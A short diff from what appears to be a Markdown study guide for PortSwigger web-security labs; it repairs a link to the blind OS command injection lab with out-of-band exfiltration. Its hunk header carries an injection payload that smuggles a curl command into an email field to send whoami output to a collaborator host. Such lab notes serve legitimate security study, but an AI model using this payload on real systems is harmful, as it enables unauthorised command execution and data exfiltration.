@@ -2399,7 +2399,7 @@ email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
 
 ![os command injection](images/os-command-inject.png)  
 
-[PortSwigger Lab: Blind OS command injection with out-of-band data exfiltration
+[PortSwigger Lab: Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)  
  
 # Appendix  
 
